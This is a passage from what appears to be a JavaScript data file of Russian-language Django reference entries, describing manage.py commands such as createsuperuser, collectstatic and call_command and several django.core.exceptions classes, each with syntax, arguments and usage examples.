      "Команда manage.py createsuperuser — создаёт пользователя с флагами is_superuser=True и is_staff=True (полный доступ к админке и право обходить все проверки разрешений). По умолчанию запрашивает интерактивно USERNAME_FIELD, REQUIRED_FIELDS и пароль. Поддерживает неинтерактивный режим через --noinput с переменными окружения для пароля. Используется при первичной настройке проекта, в Docker-entrypoint, в скриптах CI/CD.",
    syntax:
      "manage.py createsuperuser [--noinput/--no-input] [--username USERNAME] [--email EMAIL] [--database DATABASE]",
    arguments: [
      {
        name: "--noinput, --no-input",
        description:
          "Неинтерактивный режим: вопросы не задаются. Все обязательные поля должны быть переданы либо как аргументы (--username, --email и др.), либо через переменные окружения DJANGO_SUPERUSER_<FIELD> (в верхнем регистре). Пароль читается только из DJANGO_SUPERUSER_PASSWORD; без неё пользователь создастся с установленным is_unusable_password.",
      },
      {
        name: "--username USERNAME",
        description:
          "Значение для USERNAME_FIELD модели пользователя. По умолчанию это поле username; при кастомной модели может быть любым (например, email). Если не указан и режим интерактивный — будет запрошен.",
      },
      {
        name: "--email EMAIL",
        description:
          "Email пользователя. Является REQUIRED_FIELD в стандартной модели User. Для кастомных моделей наличие зависит от REQUIRED_FIELDS. В неинтерактивном режиме обязателен (или передан как DJANGO_SUPERUSER_EMAIL).",
      },
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES, в которой создавать пользователя. По умолчанию default. Используется в multi-DB конфигурациях.",
      },
    ],
    example: `# Интерактивно
$ python manage.py createsuperuser
Username (leave blank to use 'ivan'): admin
Email address: admin@example.com
Password: ********
Password (again): ********
Superuser created successfully.

# С предзаданными username/email — спросит только пароль
$ python manage.py createsuperuser --username admin --email admin@example.com
Password: ********
Password (again): ********

# Полностью неинтерактивно (для CI / Docker-entrypoint)
$ DJANGO_SUPERUSER_PASSWORD='SecurePassword123!' \\
  DJANGO_SUPERUSER_EMAIL='admin@example.com' \\
  python manage.py createsuperuser --noinput --username admin
Superuser created successfully.

# Все поля через переменные окружения
$ DJANGO_SUPERUSER_USERNAME=admin \\
  DJANGO_SUPERUSER_EMAIL=admin@example.com \\
  DJANGO_SUPERUSER_PASSWORD=SecurePassword123! \\
  python manage.py createsuperuser --noinput

# В Docker-entrypoint.sh
#!/bin/bash
set -e
python manage.py migrate --noinput
if ! python manage.py shell -c "
from django.contrib.auth import get_user_model
import sys
sys.exit(0 if get_user_model().objects.filter(username='admin').exists() else 1)
"; then
  python manage.py createsuperuser --noinput \\
      --username admin --email admin@example.com
fi
exec gunicorn myproject.wsgi:application --bind 0.0.0.0:8000

# Кастомная модель User (email как USERNAME_FIELD)
class User(AbstractUser):
    email = models.EmailField(unique=True)
    USERNAME_FIELD = 'email'
    REQUIRED_FIELDS = ['username']

# Тогда:
$ python manage.py createsuperuser
Email: admin@example.com
Username: admin
Password: ...

# Кастомные REQUIRED_FIELDS требуют отдельных --флагов или переменных
class User(AbstractUser):
    REQUIRED_FIELDS = ['email', 'first_name', 'last_name']
$ DJANGO_SUPERUSER_FIRST_NAME=Иван \\
  DJANGO_SUPERUSER_LAST_NAME=Иванов \\
  DJANGO_SUPERUSER_EMAIL=admin@example.com \\
  DJANGO_SUPERUSER_PASSWORD='Sec123!' \\
  python manage.py createsuperuser --noinput --username admin

# Multi-DB
$ python manage.py createsuperuser --database accounts_db

# Программная альтернатива (для idempotent-скриптов):
$ python manage.py shell -c "
from django.contrib.auth import get_user_model
User = get_user_model()
User.objects.update_or_create(
    username='admin',
    defaults={'email': 'admin@example.com', 'is_staff': True, 'is_superuser': True},
)
u = User.objects.get(username='admin')
u.set_password('SecurePassword123!')
u.save()
"

# ВАЖНО:
#   - Пароль НЕ принимается через --password или -p (соображения безопасности:
#     не оставлять в shell history и в /proc/<pid>/cmdline).
#     Только через интерактивный ввод или DJANGO_SUPERUSER_PASSWORD.
#   - В --noinput без DJANGO_SUPERUSER_PASSWORD пользователь создаётся
#     с is_unusable_password=True — войти нельзя, нужна последующая
#     установка пароля (changepassword или set_password в shell).`,
  },
  {
    name: "remove_stale_contenttypes",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py remove_stale_contenttypes — удаляет «устаревшие» записи django.contrib.contenttypes.ContentType, которые ссылаются на модели или приложения, отсутствующие в текущем коде. Появляется ситуация после удаления модели/приложения из проекта: соответствующая запись ContentType остаётся, ссылочные Permission, ForeignKey-related, GenericForeignKey начинают ссылаться на «мёртвую» строку. Команда интерактивно спрашивает подтверждение, потому что каскад затронет Permission и любые объекты, использующие GenericForeignKey на устаревшие типы контента.",
    syntax:
      "manage.py remove_stale_contenttypes [--database DATABASE] [--include-stale-apps]",
    arguments: [
      {
        name: "--database DATABASE",
        description:
          "Алиас БД из DATABASES, в которой искать и удалять устаревшие записи. По умолчанию default. Должен совпадать с БД, где хранятся таблицы django_content_type и auth_permission.",
      },
      {
        name: "--include-stale-apps",
        description:
          "Также удалять ContentType и Permission, относящиеся к приложениям, которых больше нет в INSTALLED_APPS (не только удалённые модели в существующих приложениях). По умолчанию записи устаревших приложений сохраняются на случай, если приложение временно отключено.",
      },
    ],
    example: `# Стандартный запуск (только удалённые модели в существующих приложениях)
$ python manage.py remove_stale_contenttypes
Some content types in your database are stale and can be deleted.
Any objects that depend on these content types will also be deleted.
The content types and dependent objects that would be deleted are:

    - Content type for blog.OldPost
    - 4 auth.Permission object(s)
    - 12 admin.LogEntry object(s)

This list doesn't include any cascade deletions to data outside of Django's
models (uncommon).

Are you sure you want to delete these content types?
If you're unsure, answer 'no'.

    Type 'yes' to continue, or 'no' to cancel: yes
Deleting stale content type 'blog | OldPost'
Done.

# Включая приложения, удалённые из INSTALLED_APPS
$ python manage.py remove_stale_contenttypes --include-stale-apps
Some content types in your database are stale and can be deleted.
...
    - Content type for old_app.LegacyModel
    - 6 auth.Permission object(s)
...

# Для multi-DB
$ python manage.py remove_stale_contenttypes --database accounts_db

# В неинтерактивном режиме (например, в migration-скрипте)
$ echo "yes" | python manage.py remove_stale_contenttypes

# Когда команду имеет смысл запускать:
# 1) Сразу после удаления модели:
#    - удалили class OldPost(models.Model): ...
#    - запустили makemigrations + migrate (DROP TABLE blog_oldpost)
#    - django_content_type всё ещё содержит запись OldPost
$ python manage.py remove_stale_contenttypes

# 2) После удаления приложения целиком:
#    - убрали 'old_app' из INSTALLED_APPS
#    - удалили каталог old_app/ из репозитория
$ python manage.py remove_stale_contenttypes --include-stale-apps

# 3) После переименования модели:
#    Рекомендуется — миграция RenameModel (тогда ContentType обновится автоматически).
#    Если переименовали удалением+созданием — останется stale ContentType
#    со старым именем, лучше его удалить.

# Что произойдёт при удалении устаревшего ContentType:
#   - Каскадно удалятся все auth.Permission, ссылающиеся на этот тип
#   - Каскадно удалятся записи admin.LogEntry для этих объектов
#   - Удалятся объекты с GenericForeignKey, чьи content_type/object_id
#     указывают на удалённый тип (например, attachments, comments через
#     contenttypes), если на этих моделях стоит CASCADE
#   - Удалятся записи ContentType.objects.get_for_model(...) кеша

# ВАЖНО:
#   - Перед запуском в проде — сделать backup, особенно если есть
#     GenericForeignKey-связи, на которые легко не обратить внимание.
#   - Команда не запускается автоматически как часть migrate — устаревший
#     ContentType может специально оставаться на время (например, миграция
#     данных по старой модели перед окончательным удалением).
#   - Связь ContentType.objects.get_by_natural_key('blog', 'oldpost')
#     перестанет работать; код, рассчитывающий на это, нужно убрать заранее.`,
  },
  {
    name: "clearsessions",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py clearsessions — удаляет из хранилища сессий все устаревшие (expired) записи. Работает только с database-backend (django.contrib.sessions.backends.db) и cached_db-backend. Для file-backend, cache-only-backend (Memcached/Redis) и cookie-backend не имеет эффекта — эти хранилища либо сами удаляют устаревшие, либо не хранят записей в БД. Команда не принимает никаких опций. Обычно запускается по расписанию (cron, Celery Beat) — Django сам не удаляет старые сессии из БД.",
    syntax: "manage.py clearsessions",
    arguments: [],
    example: `# Запуск вручную
$ python manage.py clearsessions

# Что именно делает:
# Session.objects.filter(expire_date__lt=timezone.now()).delete()

# Настройки сессий, влияющие на накопление записей
# settings.py
SESSION_ENGINE = 'django.contrib.sessions.backends.db'  # накапливает в django_session
SESSION_COOKIE_AGE = 1209600    # 2 недели (по умолчанию)

# 1. Cron (Unix)
# 0 3 * * 0  /path/to/venv/bin/python /path/to/project/manage.py clearsessions
# Каждое воскресенье в 3:00.

# 2. Celery Beat
from celery.schedules import crontab
CELERY_BEAT_SCHEDULE = {
    'clear-expired-sessions': {
        'task': 'myapp.tasks.clear_sessions',
        'schedule': crontab(hour=3, minute=0, day_of_week=0),
    },
}
# tasks.py
from celery import shared_task
from django.core.management import call_command

@shared_task
def clear_sessions():
    call_command('clearsessions')

# 3. Django-crontab
INSTALLED_APPS = [..., 'django_crontab']
CRONJOBS = [
    ('0 3 * * 0', 'django.core.management.call_command', ['clearsessions']),
]

# Для каких backends НЕ нужна команда:
#   cache (Memcached/Redis)  — данные удаляются автоматически по TTL
#   file                     — Django проверяет expire_date при чтении файла
#   cookie / signed_cookies  — данные у клиента, просроченные браузер не отправит

# Проверка объёма устаревших сессий перед очисткой
from django.contrib.sessions.models import Session
from django.utils import timezone
expired_count = Session.objects.filter(expire_date__lt=timezone.now()).count()
print(f'Устаревших сессий: {expired_count}')

# При 100 RPS и SESSION_COOKIE_AGE=1209600 (2 недели) таблица
# django_session может накопить миллионы записей — очистка раз в неделю обязательна.`,
  },
  {
    name: "collectstatic",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py collectstatic — собирает статические файлы из STATICFILES_DIRS, из папок static/ каждого INSTALLED_APPS в единый каталог STATIC_ROOT. Обязательный шаг перед деплоем. В production Django не раздаёт статику сам — это делает nginx/Whitenoise/CDN из STATIC_ROOT. В dev-режиме (DEBUG=True) staticfiles razdayotsya напрямую через STATICFILES_DIRS без предварительного сбора. ManifestStaticFilesStorage добавляет хеш к именам файлов для вечного кеширования.",
    syntax:
      "manage.py collectstatic [--noinput] [--no-post-process] [--ignore PATTERN] [--dry-run] [--clear] [--link]",
    arguments: [
      {
        name: "--noinput, --no-input",
        description:
          "Не запрашивать подтверждение перед перезаписью STATIC_ROOT. Обязательно для CI/CD и Dockerfile.",
      },
      {
        name: "--clear, -c",
        description:
          "Полностью очистить STATIC_ROOT перед сборкой. Без флага существующие файлы перезаписываются только если изменились. Гарантирует отсутствие устаревших файлов.",
      },
      {
        name: "--dry-run, -n",
        description:
          "Показать, какие файлы были бы скопированы/обработаны, без фактической записи.",
      },
      {
        name: "--ignore PATTERN, -i PATTERN",
        description:
          'Glob-паттерн файлов для пропуска. Например: -i "*.scss" -i "*.map" для исходников стилей и source map.',
      },
      {
        name: "--no-post-process",
        description:
          "Не запускать post-processing (ManifestStaticFilesStorage не будет добавлять хеш к именам файлов). Только для отладки storage.",
      },
      {
        name: "--link, -l",
        description:
          "Создавать символические ссылки вместо копирования файлов. Ускоряет dev-цикл, не подходит для production-контейнеров.",
      },
    ],
    example: `# settings.py — обязательные настройки
STATICFILES_DIRS = [BASE_DIR / 'static']       # ваш собственный static/
STATIC_ROOT = BASE_DIR / 'staticfiles'          # куда собирает collectstatic
STATIC_URL = '/static/'

# Storage с fingerprinting (рекомендован для production)
STATICFILES_STORAGE = 'django.contrib.staticfiles.storage.ManifestStaticFilesStorage'
# style.css → style.abc123ef.css (хеш содержимого)
# → вечное кеширование без страха устаревших версий

# Стандартный запуск в деплое
$ python manage.py collectstatic --noinput
132 static files copied to '/app/staticfiles', 12 unmodified.

# Полная пересборка (удалить всё, собрать заново)
$ python manage.py collectstatic --noinput --clear

# Проверить что соберётся
$ python manage.py collectstatic --dry-run

# Игнорировать исходники SCSS и source maps
$ python manage.py collectstatic --noinput -i "*.scss" -i "*.map"

# В Dockerfile
# RUN python manage.py collectstatic --noinput

# nginx — раздача из STATIC_ROOT
# server {
#     location /static/ {
#         alias /app/staticfiles/;
#         expires max;
#         add_header Cache-Control "public, immutable";
#     }
# }

# Whitenoise — раздача прямо из Python-процесса (без nginx)
# pip install whitenoise
# MIDDLEWARE = ['whitenoise.middleware.WhiteNoiseMiddleware', ...]
# STATICFILES_STORAGE = 'whitenoise.storage.CompressedManifestStaticFilesStorage'

# django-storages — загрузка прямо на S3
# pip install django-storages[s3]
# STATICFILES_STORAGE  = 'storages.backends.s3boto3.S3StaticStorage'
# AWS_STORAGE_BUCKET_NAME = 'myapp-static'
# STATIC_URL = 'https://cdn.example.com/'

# В шаблоне (ManifestStaticFilesStorage подставит хеш)
# {% load static %}
# <link rel="stylesheet" href="{% static 'myapp/style.css' %}">
# → /static/myapp/style.abc123ef.css

# CI/CD последовательность
# python manage.py collectstatic --noinput --clear
# python manage.py migrate --noinput
# gunicorn myproject.wsgi:application`,
  },
  {
    name: "findstatic",
    category: "django-admin and manage.py",
    description:
      "Команда manage.py findstatic — показывает полный путь к статическому файлу на диске, используя те же STATICFILES_FINDERS, что и collectstatic / {% static %}. Используется для отладки: «почему берётся не тот файл?», «где именно находится admin/css/base.css?». С флагом --all возвращает все места, где файл найден — позволяет увидеть порядок приоритета finders. Не перемещает файлы, не требует STATIC_ROOT.",
    syntax: "manage.py findstatic staticfile [staticfile ...] [--all]",
    arguments: [
      {
        name: "staticfile [staticfile ...]",
        description:
          'Один или несколько относительных путей к файлу (например, "admin/css/base.css", "myapp/js/app.js"). Ищется через STATICFILES_FINDERS.',
      },
      {
        name: "--all, -a",
        description:
          "Вернуть ВСЕ пути, где файл найден (а не только первое вхождение). Показывает какой finder имеет приоритет при конфликте.",
      },
    ],
    example: `# Найти файл Django admin
$ python manage.py findstatic admin/css/base.css
Found 'admin/css/base.css' here:
  /venv/lib/python3.12/site-packages/django/contrib/admin/static/admin/css/base.css

# Найти файл из вашего приложения
$ python manage.py findstatic myapp/js/app.js
Found 'myapp/js/app.js' here:
  /project/static/myapp/js/app.js

# --all: все места, включая переопределения
$ python manage.py findstatic --all admin/css/base.css
Found 'admin/css/base.css' here:
  /project/myapp/static/admin/css/base.css   ← ваш override (первый — выиграл)
  /venv/.../django/contrib/admin/static/admin/css/base.css

# → {% static 'admin/css/base.css' %} вернёт ваш файл. Это умышленный override?

# Порядок finders (кто первый — тот побеждает)
# STATICFILES_FINDERS = [
#     'FileSystemFinder',     # ищет в STATICFILES_DIRS (выше приоритет)
#     'AppDirectoriesFinder', # ищет в <app>/static/
# ]

# Типичные сценарии:

# 1. «Почему изменения не видны?»
$ python manage.py findstatic myapp/css/style.css
# Если путь не ваш — значит файл подхватывается из другого места.

# 2. Проверка override admin-стилей
$ python manage.py findstatic --all admin/css/login.css
Found 'admin/css/login.css' here:
  /project/static/admin/css/login.css    ← первый → ваш файл раздаётся ✓

# 3. Проверить, зарегистрировала ли библиотека свою статику
$ python manage.py findstatic rest_framework/js/default.js
Found 'rest_framework/js/default.js' here:
  /venv/.../rest_framework/static/rest_framework/js/default.js
# → djangorestframework правильно добавил AppDirectoriesFinder.

# Несколько файлов сразу
$ python manage.py findstatic myapp/css/style.css myapp/js/app.js`,
  },
  {
    name: "help / version",
    category: "django-admin and manage.py",
    description:
      "Встроенные информационные команды django-admin и manage.py. help без аргументов выводит список всех доступных команд, сгруппированных по приложениям. help <command> — подробная справка по команде (синтаксис, все опции). --commands выводит только имена команд по одной на строку (удобно для скриптов и автодополнения). version выводит версию Django. Все эти команды доступны без настроенного DJANGO_SETTINGS_MODULE.",
    syntax:
      "manage.py help [command]\nmanage.py help --commands\nmanage.py version\nmanage.py <command> --help",
    arguments: [
      {
        name: "help [command]",
        description:
          "Без аргумента — общая справка и список команд по приложениям. С именем команды — детальная справка: описание, синтаксис, все опции. Эквивалент manage.py <command> --help.",
      },
      {
        name: "--commands",
        description:
          "Вывести только имена всех доступных команд по одной на строку (без описаний). Удобно для парсинга, автодополнения оболочки.",
      },
      {
        name: "version",
        description:
          'Вывести версию Django и завершить. Эквивалент: python -c "import django; print(django.__version__)".',
      },
    ],
    example: `# Версия Django
$ python manage.py version
5.2.0

$ django-admin version
5.2.0

# Список всех команд (по приложениям)
$ python manage.py help
Available subcommands:
[auth]
    changepassword
    createsuperuser
[django]
    check
    compilemessages
    ...

# Только имена (для скриптов)
$ python manage.py help --commands
changepassword
check
clearsessions
collectstatic
...

# Проверить что библиотека зарегистрировала свои команды
$ python manage.py help --commands | grep celery
celery

# Справка по команде — два эквивалентных способа
$ python manage.py help migrate
$ python manage.py migrate --help
usage: manage.py migrate [-h] [--database DATABASE] [--fake] ...
  --database DATABASE   Nominates a database to synchronize.
  --fake                Mark migrations as run without running them.
  ...

# help без DJANGO_SETTINGS_MODULE (только базовые команды)
$ DJANGO_SETTINGS_MODULE='' python -m django help

# Автодополнение bash (использует --commands)
_django_completion() {
    COMPREPLY=( $(python manage.py help --commands 2>/dev/null | grep "^\${COMP_WORDS[COMP_CWORD]}") )
}
complete -F _django_completion manage.py

# Проверить версию в коде
import django
print(django.__version__)  # '5.2.0'
print(django.VERSION)      # (5, 2, 0, 'final', 0)`,
  },
  {
    name: "Способы вызова manage.py",
    category: "django-admin and manage.py",
    description:
      "Django предоставляет три эквивалентных способа запуска management-команд из командной строки: manage.py, django-admin и python -m django. manage.py автоматически устанавливает DJANGO_SETTINGS_MODULE для текущего проекта. django-admin требует явного DJANGO_SETTINGS_MODULE и используется ДО создания проекта. python -m django — наиболее явный и переносимый вариант для Docker/CI. Все три поддерживают одинаковые глобальные опции: --settings, --pythonpath, --traceback, --no-color, --force-color, --verbosity.",
    syntax:
      "manage.py <command> [options]\ndjango-admin <command> [options]\npython -m django <command> [options]",
    arguments: [
      {
        name: "manage.py <command>",
        description:
          "Автоматически настраивает DJANGO_SETTINGS_MODULE (из wsgi.py вашего проекта) и добавляет проект в PYTHONPATH. Стандартный способ для разработки. Генерируется командой startproject.",
      },
      {
        name: "django-admin <command>",
        description:
          "Глобальная консольная утилита из пакета Django. Требует явного --settings= или переменной DJANGO_SETTINGS_MODULE. Используется до создания проекта (django-admin startproject).",
      },
      {
        name: "python -m django <command>",
        description:
          "Эквивалент django-admin, запускается через python -m. Гарантирует использование конкретного Python-интерпретатора / venv. Рекомендован в Docker и CI.",
      },
      {
        name: "--settings MODULE",
        description:
          "Указать модуль настроек напрямую (переопределяет DJANGO_SETTINGS_MODULE). Формат — python.module.path: myproject.settings.production.",
      },
      {
        name: "--pythonpath PATH",
        description:
          "Добавить PATH к sys.path перед выполнением. Обычно не нужен — manage.py делает это автоматически.",
      },
      {
        name: "--traceback",
        description:
          "Печатать полный Python-traceback при ошибках. По умолчанию CommandError выводится кратко. Полезно при отладке кастомных команд.",
      },
      {
        name: "-v {0,1,2,3}, --verbosity",
        description:
          "Уровень подробности: 0 — тихий, 1 — минимум (по умолчанию), 2 — подробно, 3 — отладочный. Поддерживается большинством команд.",
      },
      {
        name: "--no-color / --force-color",
        description:
          "--no-color отключает ANSI-цвет в выводе (для CI без цветных логов). --force-color принудительно включает (для GitHub Actions).",
      },
    ],
    example: `# Три эквивалентных способа
$ python manage.py migrate
$ django-admin migrate --settings=myproject.settings
$ python -m django migrate --settings=myproject.settings

# manage.py — содержимое (генерируется startproject)
#!/usr/bin/env python
import os, sys
def main():
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'myproject.settings')
    from django.core.management import execute_from_command_line
    execute_from_command_line(sys.argv)
if __name__ == '__main__':
    main()

# django-admin — до создания проекта
$ pip install django
$ django-admin startproject myproject
$ django-admin startapp blog

# Переключение настроек без правки файлов
$ python manage.py migrate --settings=myproject.settings.production
$ DJANGO_SETTINGS_MODULE=myproject.settings.production python manage.py migrate

# python -m django в Docker
# CMD ["python", "-m", "django", "migrate", "--noinput",
#                                "--settings=myproject.settings.production"]

# Глобальные опции (работают с любой командой):

# Полный traceback при ошибке
$ python manage.py migrate --traceback

# Разные уровни подробности
$ python manage.py collectstatic --noinput -v 0   # тихий
$ python manage.py migrate -v 2                   # каждый SQL
$ python manage.py collectstatic -v 3             # отладочный (каждый файл)

# Без цвета (для CI-логов)
$ python manage.py check --no-color

# С цветом в GitHub Actions
$ python manage.py check --force-color

# Проверка нескольких окружений подряд
$ for env in staging production; do
    echo "=== $env ===" && \\
    DJANGO_SETTINGS_MODULE=myproject.settings.$env \\
    python manage.py check --deploy --fail-level WARNING
  done`,
  },
  {
    name: "call_command()",
    category: "django-admin and manage.py",
    description:
      "Функция django.core.management.call_command() — программный вызов management-команд из Python-кода: в тестах, в других командах, в миграциях (RunPython), в Celery-задачах, в скриптах. Полный эквивалент CLI-вызова. Позиционные аргументы передаются как *args, опции — как **kwargs (длинный флаг --dry-run → dry_run=True). Вывод идёт в stdout по умолчанию; для захвата используется io.StringIO. Синхронная функция — блокирует до завершения.",
    syntax: `from django.core.management import call_command
call_command(name, *args, **options)`,
    arguments: [
      {
        name: "name",
        description:
          'Имя команды как строка ("migrate", "collectstatic") или объект BaseCommand. Строка — стандартный способ.',
      },
      {
        name: "*args",
        description:
          'Позиционные аргументы команды. Например: call_command("dumpdata", "blog", "auth") → manage.py dumpdata blog auth.',
      },
      {
        name: "**options",
        description:
          'Опции как kwargs. --dry-run → dry_run=True, --database DATABASE → database="replica", --verbosity 0 → verbosity=0. Флаги с дефисом → подчёркивание. Передавать строки типа "--noinput" — НЕЛЬЗЯ, только kwargs.',
      },
    ],
    example: `from django.core.management import call_command
import io

# Базовый вызов
call_command('migrate')
call_command('migrate', 'blog', '0040')           # manage.py migrate blog 0040

# Опции как kwargs (НЕ строки)
call_command('migrate', noinput=True)             # --noinput ✓
call_command('migrate', '--noinput')              # НЕВЕРНО ✗

call_command('dumpdata', 'blog',
             indent=2,
             natural_foreign=True,
             output='backup.json')

call_command('loaddata', 'initial_data',
             database='default',
             verbosity=0)

# Захват вывода в переменную
out = io.StringIO()
call_command('dumpdata', 'blog', stdout=out, indent=2)
import json
data = json.loads(out.getvalue())
print(f'Выгружено объектов: {len(data)}')

# Перехват stderr
err = io.StringIO()
call_command('check', stderr=err)
if err.getvalue():
    notify_team(err.getvalue())

# В тестах
from django.test import TestCase

class ArticleTest(TestCase):
    def setUp(self):
        call_command('loaddata', 'categories', verbosity=0)
        call_command('loaddata', 'articles',   verbosity=0)

    def test_check_passes(self):
        try:
            call_command('check')
        except SystemExit as e:
            self.fail(f'System checks failed: {e}')

# В Celery-задаче
from celery import shared_task

@shared_task
def nightly_cleanup():
    call_command('clearsessions')

# В миграции (RunPython)
from django.core.management import call_command
from django.db import migrations

def load_initial_data(apps, schema_editor):
    call_command('loaddata', 'initial_categories',
                 app_label='blog',
                 verbosity=0)

class Migration(migrations.Migration):
    dependencies = [('blog', '0001_initial')]
    operations = [
        migrations.RunPython(load_initial_data,
                             reverse_code=migrations.RunPython.noop),
    ]

# Маппинг CLI-флагов → kwargs
# --dry-run           → dry_run=True
# --no-input          → no_input=True
# --database default  → database='default'
# --verbosity 0       → verbosity=0
# --format json       → format='json'
# -l ru               → locale=['ru']  (если action='append')
# app_label (positional) → positional arg (*args)

# Обработка ошибок
from django.core.management.base import CommandError

try:
    call_command('migrate', 'nonexistent_app')
except CommandError as e:
    print(f'Ошибка: {e}')

# Проверить exit-код
try:
    call_command('migrate', check=True)   # --check
except SystemExit as e:
    if e.code != 0:
        raise RuntimeError('Есть непримененные миграции')`,
  },
  {
    name: "AppRegistryNotReady",
    category: "Django Exceptions",
    description:
      "Возникает при попытке использовать модели или обращаться к реестру приложений до того, как Django завершил инициализацию приложений (то есть до окончания работы метода AppConfig.ready()). Чаще всего встречается при импорте моделей на уровне модуля вне приложения Django.",
    syntax: "from django.core.exceptions import AppRegistryNotReady",
    arguments: [],
    example: `from django.core.exceptions import AppRegistryNotReady

try:
    from myapp.models import MyModel
except AppRegistryNotReady:
    print("Реестр приложений ещё не готов")`,
  },
  {
    name: "ObjectDoesNotExist",
    category: "Django Exceptions",
    description:
      "Базовый класс для исключений Model.DoesNotExist. Перехват ObjectDoesNotExist позволяет обрабатывать ошибку отсутствия объекта для любой модели. Возникает при вызове QuerySet.get(), если объект не найден.",
    syntax: "from django.core.exceptions import ObjectDoesNotExist",
    arguments: [],
    example: `from django.core.exceptions import ObjectDoesNotExist
from myapp.models import Article

try:
    article = Article.objects.get(pk=999)
except ObjectDoesNotExist:
    print("Объект не найден")`,
  },
  {
    name: "ObjectNotUpdated",
    category: "Django Exceptions",
    description:
      "Возникает при вызове Model.save() с параметром update_fields, если ни одна строка в базе данных не была обновлена. Это означает, что объект с таким первичным ключом не существует в базе.",
    syntax: "from django.core.exceptions import ObjectNotUpdated",
    arguments: [],
    example: `from django.core.exceptions import ObjectNotUpdated
from myapp.models import Article

try:
    article = Article(pk=999, title="Тест")
    article.save(update_fields=["title"])
except ObjectNotUpdated:
    print("Объект не был обновлён — запись не найдена")`,
  },
  {
    name: "EmptyResultSet",
    category: "Django Exceptions",
    description:
      "Возникает внутри компилятора запросов, когда QuerySet гарантированно не вернёт ни одного результата, например при использовании пустого списка в условии IN. Обычно используется во внутренней логике Django ORM.",
    syntax: "from django.core.exceptions import EmptyResultSet",
    arguments: [],
    example: `from django.core.exceptions import EmptyResultSet

# Django ORM использует это исключение внутренне
# Пример: запрос с пустым списком значений
from myapp.models import Article

qs = Article.objects.filter(pk__in=[])
# Django может вызвать EmptyResultSet внутри компилятора`,
  },
  {
    name: "FullResultSet",
    category: "Django Exceptions",
    description:
      "Внутреннее исключение Django ORM, которое сигнализирует о том, что условие фильтрации охватывает все возможные строки и может быть полностью опущено в SQL-запросе. Не предназначено для использования в пользовательском коде.",
    syntax: "from django.core.exceptions import FullResultSet",
    arguments: [],
    example: `from django.core.exceptions import FullResultSet

# Используется исключительно во внутренней логике ORM Django
# при компиляции SQL-запросов. Не предназначено для перехвата
# в пользовательском коде.`,
  },
  {
    name: "FieldDoesNotExist",
    category: "Django Exceptions",
    description:
      "Возникает при вызове метода Options.get_field(), если запрошенное поле не существует в модели. Позволяет проверить наличие поля в модели без обращения к базе данных.",
    syntax: "from django.core.exceptions import FieldDoesNotExist",
    arguments: [],
    example: `from django.core.exceptions import FieldDoesNotExist
from myapp.models import Article

try:
    field = Article._meta.get_field('nonexistent_field')
except FieldDoesNotExist:
    print("Поле не найдено в модели")`,
  },
  {
    name: "MultipleObjectsReturned",
    category: "Django Exceptions",
    description:
      "Возникает при вызове QuerySet.get(), если запрос вернул более одного объекта. Каждая модель имеет собственный подкласс MultipleObjectsReturned, унаследованный от базового. Означает, что условие выборки не уникально.",
    syntax: "from django.core.exceptions import MultipleObjectsReturned",
    arguments: [],
    example: `from django.core.exceptions import MultipleObjectsReturned
from myapp.models import Article

try:
    article = Article.objects.get(status='published')
except MultipleObjectsReturned:
    print("Найдено несколько объектов, уточните запрос")`,
  },
  {
    name: "SuspiciousOperation",
    category: "Django Exceptions",
    description:
      "Возникает, когда пользователь выполнил операцию, которая считается подозрительной с точки зрения безопасности, например попытку манипуляции с куки или обход пути файловой системы. Django автоматически возвращает ответ 400 Bad Request при перехвате этого исключения.",
    syntax: "from django.core.exceptions import SuspiciousOperation",
    arguments: [],
    example: `from django.core.exceptions import SuspiciousOperation

def my_view(request):
    user_path = request.GET.get('path', '')
    if '..' in user_path:
        raise SuspiciousOperation("Обнаружена попытка обхода пути")`,
  },
  {
    name: "PermissionDenied",
    category: "Django Exceptions",
    description:
      "Возникает, когда пользователь не имеет прав для выполнения запрошенного действия. Django автоматически возвращает ответ 403 Forbidden при перехвате этого исключения в представлении.",
    syntax: "from django.core.exceptions import PermissionDenied",
    arguments: [],
    example: `from django.core.exceptions import PermissionDenied

def admin_view(request):
    if not request.user.is_staff:
        raise PermissionDenied("Доступ разрешён только администраторам")
    # дальнейшая логика представления`,
  },
  {
    name: "ViewDoesNotExist",
    category: "Django Exceptions",
    description:
      "Возникает в модуле django.urls, когда указанная функция представления не может быть найдена. Чаще всего появляется при неверно указанном пути к представлению в конфигурации URL.",
    syntax: "from django.core.exceptions import ViewDoesNotExist",
    arguments: [],
    example: `# Возникает автоматически при некорректной конфигурации URL
# urls.py
from django.urls import path

urlpatterns = [
    # Если 'myapp.views.nonexistent' не существует,
    # Django вызовет ViewDoesNotExist при старте
    path('about/', 'myapp.views.nonexistent'),
]`,
  },
  {
    name: "MiddlewareNotUsed",
    category: "Django Exceptions",
    description:
      "Может быть вызвано в методе __init__() промежуточного слоя (middleware), чтобы сообщить Django, что данный middleware не должен быть включён в цепочку обработки запросов. Django удалит его из списка активных middleware.",
    syntax: "from django.core.exceptions import MiddlewareNotUsed",
    arguments: [],
    example: `from django.core.exceptions import MiddlewareNotUsed

class DebugMiddleware:
    def __init__(self, get_response):
        import django.conf
        if not django.conf.settings.DEBUG:
            raise MiddlewareNotUsed("DebugMiddleware работает только в режиме DEBUG")
        self.get_response = get_response

    def __call__(self, request):
        return self.get_response(request)`,
  },
  {
    name: "ImproperlyConfigured",
    category: "Django Exceptions",
    description:
      "Возникает при неправильной конфигурации Django — например, при ошибках в settings.py, отсутствии обязательных настроек или некорректных значениях параметров. Сигнализирует о проблемах настройки до запуска приложения.",
    syntax: "from django.core.exceptions import ImproperlyConfigured",
    arguments: [],
    example: `from django.core.exceptions import ImproperlyConfigured
from django.conf import settings

def get_api_key():
    key = getattr(settings, 'EXTERNAL_API_KEY', None)
    if not key:
        raise ImproperlyConfigured(
            "Необходимо задать EXTERNAL_API_KEY в settings.py"
        )
    return key`,
  },
  {
    name: "FieldError",
    category: "Django Exceptions",
    description:
      "Возникает при проблемах с полями модели: неверное имя поля в запросе, конфликт имён полей, неверные аргументы в фильтре QuerySet и других ошибках, связанных с полями ORM.",
    syntax: "from django.core.exceptions import FieldError",
    arguments: [],
    example: `from django.core.exceptions import FieldError
from myapp.models import Article

try:
    articles = Article.objects.filter(nonexistent_field="value")
except FieldError as e:
    print(f"Ошибка поля: {e}")`,
  },
  {
